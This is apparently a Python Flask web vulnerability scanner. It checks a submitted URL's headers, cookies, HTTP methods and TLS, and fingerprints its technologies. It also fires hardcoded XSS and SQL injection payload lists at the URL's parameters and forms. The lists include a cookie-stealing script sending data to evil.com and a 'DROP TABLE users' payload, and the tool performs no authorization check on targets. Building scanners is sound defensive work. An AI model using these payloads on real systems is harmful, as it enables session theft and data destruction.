from flask import Flask, request, jsonify, render_template, send_from_directory
import os
from flask_cors import CORS
import requests
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
import ssl
import socket
from datetime import datetime
import OpenSSL.crypto

app = Flask(__name__)

CORS(app)  

XSS_PAYLOADS = ["<script>alert(1)</script>", 
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<div onmouseover='alert(1)'>click me</div>",
    "';alert(1);//",
    "'-alert(1)-'",
    "'-alert(1)//",
    "<img src='x' onerror='alert(1)'>",
    "<details open ontoggle='alert(1)'>",
    "<marquee onstart='alert(1)'>",
    "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
    "<svg><animate onbegin=alert(1) attributeName=x></svg>",
    "<a href='javascript:alert(1)'>click</a>",
    "<input autofocus onfocus='alert(1)'>",
    "<select autofocus onfocus='alert(1)'></select>",
    "<textarea autofocus onfocus='alert(1)'></textarea>",
    "<keygen autofocus onfocus='alert(1)'>"]

SQLI_PAYLOADS = [
    "'", 
    "1' OR '1'='1", 
    "' OR 1=1 --", 
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "\" OR 1=1 --",
    "1'; DROP TABLE users; --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT username,password,1 FROM users --",
    "admin' --",
    "admin'/*",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "' OR 1=1 LIMIT 1 --",
    "' OR sleep(5) --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND (SELECT * FROM users WHERE username = 'admin') --",
    "' AND 1=(SELECT COUNT(*) FROM tabname); --"
]

ERROR_PATTERNS = ["sql syntax", "unclosed quotation", "syntax error", "mysql_fetch", "sqlite_query", "pg_query", "sql server", "odbc_", "oracle", "oci_", "pdo"]

def check_security_headers(url):
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        
        security_headers = {
            "Strict-Transport-Security": "Protects against MiTM by forcing HTTPS",
            "Content-Security-Policy": "Prevents XSS and injection attacks",
            "X-Frame-Options": "Prevents clickjacking",
            "X-Content-Type-Options": "Prevents MIME sniffing",
            "Referrer-Policy": "Controls referrer information"
        }
        
        return {header: security_headers[header] for header in security_headers if header not in headers}
    except requests.exceptions.RequestException as e:
        return {"error": f"Security headers verification error: {str(e)}"}

def check_security_misconfigurations(url):
    issues = {}

    try:
        parsed_url = urlparse(url)
        response = requests.get(url, timeout=5)
        headers = response.headers
        
        # HTTPS
        if parsed_url.scheme.lower() != "https":
            issues["HTTPS Redirection"] = "The site allows HTTP connections, making it vulnerable to MiTM attacks."
        
        # CORS
        if "Access-Control-Allow-Origin" in headers and headers["Access-Control-Allow-Origin"] == "*":
            issues["CORS Misconfiguration"] = "The server allows any origin, which can lead to data exposure."
        
        # Server info 
        if "Server" in headers:
            issues["Server Banner Disclosure"] = "The server reveals information about the technologies used."
        
        #  Cookies check
        if "Set-Cookie" in headers:
            cookies = headers.get("Set-Cookie", "").lower()
            if "secure;" not in cookies and "secure " not in cookies:
                issues["Insecure Cookies"] = "Cookies without the 'Secure' attribute can be transmitted over unsecured connections."
            if "httponly;" not in cookies and "httponly " not in cookies:
                issues["Insecure Cookies"] = issues.get("Insecure Cookies", "") + " Cookies without the 'HttpOnly' attribute can be accessed via JavaScript."
                
        return issues
    except requests.exceptions.RequestException as e:
        return {"error": f"Error verifying HTTP configurations: {str(e)}"}

def check_dangerous_http_methods(url):
    issues = {}
    try:
        options_response = requests.options(url, timeout=5)
        allowed_methods = options_response.headers.get("Allow", "")
        dangerous_methods = {"PUT", "DELETE", "TRACE", "CONNECT"}
        found_methods = dangerous_methods.intersection(set(method.strip() for method in allowed_methods.split(",")))
        
        if found_methods:
            issues["Dangerous HTTP Methods"] = f"The server allows dangerous HTTP methods: {', '.join(found_methods)}."
        
        return issues
    except requests.exceptions.RequestException:
        return {}  

def check_ssl_tls(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.netloc

    if ":" in hostname:
        hostname = hostname.split(":")[0]
    
    results = {
        "certificate": {},
        "protocols": {},
        "cipher_suites": [],
        "issues": []
    }
    
    try:
        # search for certificate
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert_bin = ssock.getpeercert(True)
                x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert_bin)
                
                # Certificate details
                cert_subject = dict(x509.get_subject().get_components())
                cert_issuer = dict(x509.get_issuer().get_components())
                
                results["certificate"]["subject"] = {k.decode(): v.decode() for k, v in cert_subject.items()}
                results["certificate"]["issuer"] = {k.decode(): v.decode() for k, v in cert_issuer.items()}
                results["certificate"]["version"] = x509.get_version()
                
                # Expire date
                not_after = x509.get_notAfter().decode('utf-8')
                not_before = x509.get_notBefore().decode('utf-8')
                
                # Date-time conversion
                expiry_date = datetime.strptime(not_after, "%Y%m%d%H%M%SZ")
                start_date = datetime.strptime(not_before, "%Y%m%d%H%M%SZ")
                
                results["certificate"]["valid_from"] = start_date.strftime("%d-%m-%Y")
                results["certificate"]["valid_until"] = expiry_date.strftime("%d-%m-%Y")
                results["certificate"]["days_remaining"] = (expiry_date - datetime.now()).days
                
                # Check for validity
                if datetime.now() > expiry_date:
                    results["issues"].append("Certificatul SSL a expirat")
                if results["certificate"]["days_remaining"] < 30:
                    results["issues"].append(f"The SSL certificate expires in {results['certificate']['days_remaining']} zile")
                
                results["cipher_suites"].append(ssock.cipher())
        
        # Check for insecure protocols (1.0 & 1.1)
        insecure_protocols = [
            ("TLS 1.0", ssl.PROTOCOL_TLSv1),
            ("TLS 1.1", ssl.PROTOCOL_TLSv1_1)
        ]
        
        for protocol_name, protocol in insecure_protocols:
            try:
                context = ssl.SSLContext(protocol)
                with socket.create_connection((hostname, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        results["protocols"][protocol_name] = True
                        results["issues"].append(f"The server accepts insecure protocol {protocol_name}")
            except (ssl.SSLError, socket.error, socket.timeout):
                results["protocols"][protocol_name] = False

        # Check for secure protocols (1.2 & 1.3) 
        secure_protocols = [
            ("TLS 1.2", ssl.PROTOCOL_TLSv1_2),
            ("TLS 1.3", ssl.PROTOCOL_TLS)
        ]
        
        secure_protocol_found = False
        for protocol_name, protocol in secure_protocols:
            try:
                
                context = ssl.SSLContext(protocol)
                with socket.create_connection((hostname, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        results["protocols"][protocol_name] = True
                        secure_protocol_found = True
            except (ssl.SSLError, socket.error, socket.timeout):
                results["protocols"][protocol_name] = False
        
        if not secure_protocol_found:
            results["issues"].append("The server does not accept modern (secure) TLS protocols (1.2 or 1.3)")
        
        return results
    except Exception as e:
        return {"error": f"Error verifying SSL/TLS: {str(e)}"}

# Check url for SQLi and XSS vulnerabilities
def check_url_parameters_vulnerabilities(url):
    vulnerabilities = {}
    
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    
    if params:
        # SQL Injection
        sqli_vulnerabilities = []
        for param in params:
            for payload in SQLI_PAYLOADS:
                test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                
                if test_vulnerability(test_url, check_type="SQLi", payload=payload):
                    sqli_vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "Error-based SQLi"
                    })
                    break
        
        if sqli_vulnerabilities:
            vulnerabilities["SQL Injection"] = {
                "description": "Possible SQL Injection vulnerability in URL parameters.",
                "details": sqli_vulnerabilities
            }
        
        # Cross-Site Scripting
        xss_vulnerabilities = []
        for param in params:
            for payload in XSS_PAYLOADS:
                test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                
                if test_vulnerability(test_url, check_type="XSS", payload=payload):
                    xss_vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "Reflected XSS"
                    })
                    break
        
        if xss_vulnerabilities:
            vulnerabilities["XSS"] = {
                "description": "Possible Cross-Site Scripting vulnerability in URL parameters.",
                "details": xss_vulnerabilities
            }
    
    return vulnerabilities

# Check forms for SQLi and XSS vulnerabilities
def check_forms_vulnerabilities(url, content):
    vulnerabilities = {}
    
    try:
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')
        
        vulnerable_forms = []
        
        for i, form in enumerate(forms):
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').upper()
            
            # Handle relative URLs
            if form_action.startswith('/'):
                parsed_url = urlparse(url)
                form_action = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
            elif not form_action.startswith(('http://', 'https://')):
                form_action = url
            
            # Get form fields
            fields = []
            for input_field in form.find_all(['input', 'textarea']):
                if input_field.get('name'):
                    fields.append({
                        'name': input_field.get('name'),
                        'type': input_field.get('type', 'text'),
                        'value': input_field.get('value', '')
                    })
            
            # Skip forms with no fields or no action
            if not fields or not form_action:
                continue
            
            form_vulnerabilities = []
            
            # Test each field
            for field in fields:
                field_name = field['name']
                
                # Skip field types that are typically not vulnerable
                if field['type'] in ['hidden', 'checkbox', 'radio', 'submit', 'button', 'file']:
                    continue
                
                # Skip security tokens
                if any(token_name in field_name.lower() for token_name in ['csrf', 'token', '_token', 'xsrf']):
                    continue
                
                # Test for XSS and SQLi
                for check_type, payloads in [("XSS", XSS_PAYLOADS), ("SQLi", SQLI_PAYLOADS)]:
                    for payload in payloads:
                        form_data = {}
                        for f in fields:
                            if f['name'] == field_name:
                                form_data[f['name']] = payload
                            else:
                                form_data[f['name']] = f['value'] or "test"
                        
                        if test_vulnerability(
                            form_action, 
                            method=form_method, 
                            params=form_data if form_method == "GET" else None,
                            data=form_data if form_method == "POST" else None,
                            payload=payload,
                            check_type=check_type
                        ):
                            form_vulnerabilities.append({
                                "field": field_name,
                                "type": "Error-based SQLi" if check_type == "SQLi" else "Reflected XSS",
                                "payload": payload
                            })
                            break  # Next field
                    
                    # If vulnerability found, move to next field
                    if any(v["field"] == field_name for v in form_vulnerabilities):
                        break
            
            if form_vulnerabilities:
                vulnerable_form = {
                    "form_id": i+1,
                    "action": form_action,
                    "method": form_method,
                    "fields": [field['name'] for field in fields],
                    "vulnerabilities": form_vulnerabilities
                }
                vulnerable_forms.append(vulnerable_form)
        
        if vulnerable_forms:
            vulnerabilities["Vulnerable_Forms"] = {
                "description": f"{len(vulnerable_forms)} forms vulnerable to injection were detected.",
                "forms": vulnerable_forms
            }
    
    except Exception as e:
        vulnerabilities["Forms_Error"] = f"Error processing forms: {str(e)}"
    
    return vulnerabilities

def detect_technologies(url, content):
    technologies = {}
    
    # detect from headers
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        
        # server
        if "Server" in headers:
            technologies["Server"] = headers["Server"]
        
        # Powered-By
        if "X-Powered-By" in headers:
            technologies["X-Powered-By"] = headers["X-Powered-By"]
        
    except requests.exceptions.RequestException:
        pass
    
    # detect from content
    soup = BeautifulSoup(content, 'html.parser')
    
    # WordPress
    wp_signs = [
        soup.find("meta", {"name": "generator", "content": lambda x: x and "WordPress" in x}),
        soup.find("link", {"rel": "https://api.w.org/"}),
        soup.find("script", src=lambda x: x and "wp-" in x),
        soup.find("link", href=lambda x: x and "wp-content" in x)
    ]
    
    if any(wp_signs):
        technologies["CMS"] = "WordPress"
    
    # React
    react_signs = [
        soup.find("div", {"id": "root"}),
        soup.find("div", {"id": "app"}),
        soup.find(lambda tag: tag.name and tag.get('data-reactroot') is not None),
        "reactjs" in content.lower() or "react.js" in content.lower() or "_reactRootContainer" in content
    ]
    
    if any(react_signs):
        technologies["Frontend"] = "React"
    
    # Angular
    angular_signs = [
        soup.find(lambda tag: tag.name and tag.get('ng-app') is not None),
        soup.find(lambda tag: tag.name and tag.get('ng-controller') is not None),
        soup.find(lambda tag: tag.name and tag.get('ng-') is not None),
        "angular" in content.lower()
    ]
    
    if any(angular_signs):
        technologies["Frontend"] = technologies.get("Frontend", "")
        if "Angular" not in technologies["Frontend"]:
            technologies["Frontend"] += " Angular" if technologies["Frontend"] else "Angular"
    
    # Vue.js
    vue_signs = [
        soup.find(lambda tag: tag.name and tag.get('v-') is not None),
        "vue" in content.lower() or "vuejs" in content.lower(),
        soup.find("script", text=lambda x: x and "new Vue" in x if x else False)
    ]
    
    if any(vue_signs):
        technologies["Frontend"] = technologies.get("Frontend", "")
        if "Vue.js" not in technologies["Frontend"]:
            technologies["Frontend"] += " Vue.js" if technologies["Frontend"] else "Vue.js"
    
    # technologies from meta tags
    meta_generator = soup.find("meta", {"name": "generator"})
    if meta_generator and meta_generator.get("content"):
        technologies["Generator"] = meta_generator.get("content")

    # from cookies
    try:
        cookies = response.cookies
        for cookie in cookies:
            if cookie.name.lower() in ['phpsessid', 'aspsessionid', 'jsessionid']:
                if cookie.name.lower() == 'phpsessid':
                    technologies["Backend"] = "PHP"
                elif cookie.name.lower() == 'aspsessionid':
                    technologies["Backend"] = "ASP.NET"
                elif cookie.name.lower() == 'jsessionid':
                    technologies["Backend"] = "Java"
    except:
        pass
    
    # basic case = HTML/JS
    if not any(k in ["CMS", "Frontend", "Backend"] for k in technologies.keys()):
        technologies["Type"] = "Simple HTML/JS"
    
    return technologies

# Main function to run all security checks
def run_security_scan(url):
    try:
        # basic URL validation
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            return {"error": "URL invalid!"}
            
        response = requests.get(url, timeout=5)
        content = response.text
        
        # run security checks
        missing_headers = check_security_headers(url)
        http_issues = check_security_misconfigurations(url)
        dangerous_methods = check_dangerous_http_methods(url)
        
        # Detectare tehnologii
        technologies = detect_technologies(url, content)
        
        # SSL/TLS check
        ssl_tls_results = {}
        if parsed_url.scheme.lower() == "https":
            ssl_tls_results = check_ssl_tls(url)

        # combine all HTTP security issues 
        security_issues = {}
        security_issues.update(http_issues)
        security_issues.update(dangerous_methods)

        # URL parameters check
        url_vulnerabilities = check_url_parameters_vulnerabilities(url)

        # Forms check     
        forms_vulnerabilities = check_forms_vulnerabilities(url, content)

        vulnerabilities = {}
        vulnerabilities.update(url_vulnerabilities)
        vulnerabilities.update(forms_vulnerabilities)
        
        return {
            "missing_headers": missing_headers, 
            "security_issues": security_issues,
            "vulnerabilities": vulnerabilities,
            "technologies": technologies, 
            "ssl_tls": ssl_tls_results if parsed_url.scheme.lower() == "https" else {"error": "SSL/TLS analysis is available only for HTTPS URLs"}
        }
    except requests.exceptions.RequestException as e:
        return {"error": f"Conection error: {str(e)}"}

# General function for SQLi and XSS testing
def test_vulnerability(url, method="GET", params=None, data=None, payload=None, check_type="XSS"):
    """
    General function to test for vulnerabilities
    - Sends the request
    - Checks the response for vulnerability hints
    - Returns True if vulnerability found
    """
    try:
        response = None
        if method.upper() == "GET":
            response = requests.get(url, params=params, timeout=5)
        else:
            response = requests.post(url, data=data, timeout=5)
        
        if response:
            content = response.text.lower()
            
            if check_type == "XSS" and payload and payload in response.text:
                return True
            elif check_type == "SQLi" and any(pattern in content for pattern in ERROR_PATTERNS):
                return True
    except:
        pass
    
    return False

# Flask routes
@app.route('/')
def home():
    return send_from_directory('frontend', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('frontend', filename)

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    url = data.get("url", "")

    if not url or not (url.startswith("http://") or url.startswith("https://")):
        return jsonify({"error": "Invalid URL. The URL must start with http:// or https://"}), 400

    result = run_security_scan(url)
    return jsonify(result)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5100)